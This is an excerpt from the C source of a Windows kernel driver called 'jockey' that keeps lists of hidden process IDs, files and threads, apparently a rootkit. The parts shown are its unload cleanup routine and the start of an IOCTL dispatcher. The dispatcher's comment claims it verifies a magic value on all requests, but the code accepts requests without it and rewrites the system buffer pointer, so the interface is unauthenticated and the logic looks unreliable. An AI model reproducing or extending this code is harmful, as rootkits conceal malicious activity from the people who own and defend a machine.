...
void jockey_unload(PDRIVER_OBJECT driver);
...
NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)
{
    ...
    driver->DriverUnload = jockey_unload;
...
void jockey_unload(PDRIVER_OBJECT driver)
{
    struct jky_hidden_pid *pid, *pid_next;
    struct jky_hidden_file *hf, *hf_next;
    struct jky_hidden_thread *th, *th_next;
    NTSTATUS status;
    UNREFERENCED_PARAMETER(driver);

    /* Free hidden PID list */
    pid = g_hidden_pids;
    while (pid) {
        pid_next = pid->next;
        ExFreePoolWithTag(pid, 'dPhJ');
        pid = pid_next;
    }
    g_hidden_pids = NULL;

    /* Free hidden file list */
    hf = g_hidden_files;
    while (hf) {
        hf_next = hf->next;
    ...
    /* Free hidden thread list */
    th = g_hidden_threads;
    while (th) {
        th_next = th->next;
        ExFreePoolWithTag(th, 'dThJ');
        th = th_next;
    }
    g_hidden_threads = NULL;

    /* Delete symbolic link then device */
    status = IoDeleteSymbolicLink(&g_symlink);
    if (!NT_SUCCESS(status))
        DbgPrint("[jockey] IoDeleteSymbolicLink failed: 0x%X\n", status);

    IoDeleteDevice(driver->DeviceObject);
    DbgPrint("[jockey] Driver unloaded\n");
}
...
static NTSTATUS jockey_ioctl_dispatcher(PDEVICE_OBJECT dev, PIRP irp)
{
    ...
    /* Verify magic on all requests — skip if payload has no magic prefix */
    if (in_len >= sizeof(uint32_t)) {
        magic = *(uint32_t *)irp->AssociatedIrp.SystemBuffer;
        if (magic == JKY_IOCTL_MAGIC) {
            /* Legacy: magic present, skip it */
            irp->AssociatedIrp.SystemBuffer = (UCHAR *)irp->AssociatedIrp.SystemBuffer + 4;
        }
    }
